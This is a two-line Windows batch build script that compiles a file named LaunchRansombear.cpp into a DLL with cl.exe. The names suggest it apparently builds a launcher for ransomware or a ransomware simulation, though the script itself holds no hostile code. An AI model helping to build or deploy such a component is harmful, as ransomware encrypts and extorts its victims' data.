@ECHO OFF

cl.exe /O2 /D_USRDLL /D_WINDLL LaunchRansombear.cpp LaunchRansombear.def /MT /link /DLL /OUT:LaunchRansombear.dll